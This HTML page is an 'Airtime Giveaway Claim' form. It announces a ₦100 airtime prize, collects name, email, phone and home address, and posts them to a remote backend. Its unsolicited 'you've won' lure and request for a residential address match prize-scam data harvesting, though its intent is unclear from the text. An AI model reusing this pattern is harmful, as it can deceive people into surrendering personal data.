<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Airtime Giveaway Claim</title>
    <link rel="icon" href="data:,">
    <!-- Premium Google Font -->
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-color: #050505;
            --card-bg: rgba(20, 20, 25, 0.7);
            --input-bg: rgba(255, 255, 255, 0.05);
            --border-color: rgba(255, 255, 255, 0.1);
            --text-primary: #ffffff;
            --text-secondary: #a1a1aa;
            --accent: #d946ef; /* Vibrant pink/purple */
            --accent-hover: #c026d3;
            --accent-gradient: linear-gradient(135deg, #d946ef, #8b5cf6);
            --success: #10b981;
            --error: #ef4444;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Outfit', sans-serif;
            -webkit-font-smoothing: antialiased;
        }

        body {
            background-color: var(--bg-color);
            background-image: 
                radial-gradient(circle at 15% 50%, rgba(217, 70, 239, 0.15), transparent 25%),
                radial-gradient(circle at 85% 30%, rgba(139, 92, 246, 0.15), transparent 25%);
            color: var(--text-primary);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .app-container {
            width: 100%;
            max-width: 450px;
            background: var(--card-bg);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border-radius: 30px;
            padding: 40px 30px;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.4), inset 0 1px 0 rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.08);
            position: relative;
            overflow: hidden;
        }
        
        .app-container::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0; height: 4px;
            background: var(--accent-gradient);
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        .celebrate-icon {
            font-size: 3rem;
            margin-bottom: 10px;
            animation: bounce 2s infinite ease-in-out;
            display: inline-block;
        }

        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }

        h2 {
            font-weight: 800;
            font-size: 2rem;
            background: var(--accent-gradient);
            -webkit-background-clip: text;
            background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: -0.5px;
            margin-bottom: 8px;
        }

        .subtitle {
            font-size: 1rem;
            color: var(--text-secondary);
            font-weight: 400;
            line-height: 1.5;
        }

        /* Form Group */
        .form-group {
            margin-bottom: 20px;
            position: relative;
        }

        .form-group label {
            display: block;
            font-size: 0.85rem;
            font-weight: 500;
            color: var(--text-secondary);
            margin-bottom: 8px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .input-field {
            width: 100%;
            background: var(--input-bg);
            border: 1px solid var(--border-color);
            border-radius: 16px;
            padding: 16px 20px;
            font-size: 1rem;
            color: var(--text-primary);
            outline: none;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .input-field::placeholder {
            color: rgba(255, 255, 255, 0.3);
        }

        .input-field:focus {
            border-color: var(--accent);
            background: rgba(255, 255, 255, 0.08);
            box-shadow: 0 0 0 4px rgba(217, 70, 239, 0.15);
        }
        
        textarea.input-field {
            resize: vertical;
            min-height: 80px;
        }

        /* Continue Button */
        .continue-btn {
            width: 100%;
            background: var(--accent-gradient);
            color: white;
            border: none;
            padding: 18px;
            border-radius: 16px;
            font-size: 1.1rem;
            font-weight: 700;
            cursor: pointer;
            margin-top: 10px;
            transition: all 0.3s;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
            box-shadow: 0 10px 25px -5px rgba(217, 70, 239, 0.4);
        }

        .continue-btn:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 15px 30px -5px rgba(217, 70, 239, 0.5);
            filter: brightness(1.1);
        }

        .continue-btn:active:not(:disabled) {
            transform: translateY(0);
        }

        .continue-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            filter: grayscale(0.5);
            box-shadow: none;
        }

        /* Status Area */
        .status-area {
            margin-top: 24px;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .status-item {
            padding: 16px;
            border-radius: 16px;
            font-size: 0.95rem;
            display: flex;
            align-items: flex-start;
            gap: 12px;
            animation: slideUp 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
            opacity: 0;
            transform: translateY(20px);
            line-height: 1.4;
        }

        .status-item.success {
            background: rgba(16, 185, 129, 0.15);
            border: 1px solid rgba(16, 185, 129, 0.3);
            color: #34d399;
        }

        .status-item.error {
            background: rgba(239, 68, 68, 0.15);
            border: 1px solid rgba(239, 68, 68, 0.3);
            color: #f87171;
        }

        .status-item.pending {
            background: rgba(217, 70, 239, 0.15);
            border: 1px solid rgba(217, 70, 239, 0.3);
            color: #e879f9;
        }

        .status-icon {
            font-size: 1.2rem;
            margin-top: 2px;
        }

        /* Spinner */
        .spinner {
            width: 22px;
            height: 22px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
            display: none;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        @keyframes slideUp {
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .detected-network {
            position: absolute;
            right: 16px;
            top: 40px;
            font-size: 0.8rem;
            font-weight: 700;
            padding: 4px 10px;
            border-radius: 20px;
            background: rgba(255,255,255,0.1);
            color: var(--text-secondary);
            pointer-events: none;
            transition: all 0.3s;
            opacity: 0;
        }
        
        .detected-network.show {
            opacity: 1;
        }

    </style>
</head>

<body>

    <div class="app-container">
        <div class="header">
            <div class="celebrate-icon">🎉</div>
            <h2>Congratulations!</h2>
            <p class="subtitle">You've won <strong>₦100 Airtime</strong>.<br>Fill the form below to claim it instantly.</p>
        </div>

        <div class="form-group">
            <label for="claim-name">Full Name</label>
            <input type="text" class="input-field" id="claim-name" placeholder="John Doe">
        </div>

        <div class="form-group">
            <label for="claim-email">Email Address</label>
            <input type="email" class="input-field" id="claim-email" placeholder="john@example.com">
        </div>

        <div class="form-group">
            <label for="claim-phone">Phone Number</label>
            <input type="tel" class="input-field" id="claim-phone" placeholder="0803 000 0000" oninput="detectNetworkLocal()">
            <div id="network-badge" class="detected-network">Detecting...</div>
        </div>

        <div class="form-group">
            <label for="claim-address">Residential Address</label>
            <textarea class="input-field" id="claim-address" placeholder="Enter your full address"></textarea>
        </div>

        <button class="continue-btn" id="claim-btn" onclick="submitClaim()">
            <span class="spinner" id="btn-spinner"></span>
            <span id="btn-text">Claim My ₦100 Airtime</span>
        </button>

        <div class="status-area" id="status-area"></div>
    </div>

    <script>
        const RENDER_BACKEND_URL = 'https://airtime-backend-zuob.onrender.com';
        
        // Simple client-side detection for UI feedback only (Backend does the real validation)
        function getNetwork(phone) {
            const num = phone.replace(/[^0-9]/g, '');
            if (num.length < 4) return null;
            
            let prefix = num.substring(0, 4);
            // Handle +234
            if (num.startsWith('234') && num.length > 4) {
                prefix = '0' + num.substring(3, 6);
            }
            
            const mtn = ['0803','0806','0703','0706','0813','0816','0810','0814','0903','0906','0913','0916'];
            const glo = ['0805','0807','0705','0815','0811','0905','0915'];
            const airtel = ['0802','0808','0708','0812','0701','0902','0901','0904','0907','0912'];
            const mobile9 = ['0809','0818','0817','0909','0908'];
            
            if (mtn.includes(prefix)) return 'MTN';
            if (glo.includes(prefix)) return 'Glo';
            if (airtel.includes(prefix)) return 'Airtel';
            if (mobile9.includes(prefix)) return '9Mobile';
            
            return null;
        }

        function detectNetworkLocal() {
            const phone = document.getElementById('claim-phone').value;
            const badge = document.getElementById('network-badge');
            const network = getNetwork(phone);
            
            if (phone.length > 3) {
                badge.classList.add('show');
                if (network) {
                    badge.textContent = network;
                    badge.style.color = '#fff';
                    // Colors
                    if(network === 'MTN') badge.style.background = '#eab308'; // Yellow
                    if(network === 'Glo') badge.style.background = '#22c55e'; // Green
                    if(network === 'Airtel') badge.style.background = '#ef4444'; // Red
                    if(network === '9Mobile') badge.style.background = '#15803d'; // Dark Green
                } else {
                    badge.textContent = 'Unknown';
                    badge.style.background = 'rgba(255,255,255,0.1)';
                    badge.style.color = 'var(--text-secondary)';
                }
            } else {
                badge.classList.remove('show');
            }
        }

        async function submitClaim() {
            const name = document.getElementById('claim-name').value.trim();
            const email = document.getElementById('claim-email').value.trim();
            const phone = document.getElementById('claim-phone').value.trim();
            const address = document.getElementById('claim-address').value.trim();
            const statusArea = document.getElementById('status-area');

            // Validation
            if (!name || !email || !phone || !address) {
                showStatus('error', '⚠️', 'Please fill in all fields to claim your airtime.');
                return;
            }

            // UI State Update
            const btn = document.getElementById('claim-btn');
            const btnText = document.getElementById('btn-text');
            const spinner = document.getElementById('btn-spinner');

            btn.disabled = true;
            btnText.textContent = 'Verifying & Sending...';
            spinner.style.display = 'block';
            statusArea.innerHTML = ''; 

            const isLocal = window.location.hostname === 'localhost' ||
                window.location.hostname === '127.0.0.1' ||
                window.location.protocol === 'file:';

            const apiEndpoint = isLocal
                ? 'http://localhost:5000/api/dispense-airtime'
                : `${RENDER_BACKEND_URL}/api/dispense-airtime`;

            showStatus('pending', '⏳', 'Processing your claim... Please wait.');

            try {
                const response = await fetch(apiEndpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        name: name,
                        email: email,
                        phoneNumber: phone,
                        address: address
                        // Network and Amount are handled by backend
                    })
                });

                const data = await response.json();
                statusArea.innerHTML = ''; // clear pending

                if (response.ok && data.success) {
                    showStatus('success', '✅', `Awesome! ₦100 airtime has been sent to ${phone}. Enjoy!`);
                    // Optionally clear form
                    document.getElementById('claim-name').value = '';
                    document.getElementById('claim-email').value = '';
                    document.getElementById('claim-phone').value = '';
                    document.getElementById('claim-address').value = '';
                    document.getElementById('network-badge').classList.remove('show');
                } else {
                    showStatus('error', '❌', data.message || 'We could not process your claim at this time.');
                }
            } catch (error) {
                statusArea.innerHTML = ''; // clear pending
                showStatus('error', '⚠️', 'Network error. Make sure you are connected to the internet and the server is running.');
                console.error("Fetch Error:", error);
            }

            // Restore UI
            btn.disabled = false;
            btnText.textContent = 'Claim My ₦100 Airtime';
            spinner.style.display = 'none';
        }
        
        function showStatus(type, icon, message) {
            const statusArea = document.getElementById('status-area');
            statusArea.innerHTML = `
                <div class="status-item ${type}">
                    <div class="status-icon">${icon}</div>
                    <div>${message}</div>
                </div>
            `;
        }
    </script>
</body>
</html>
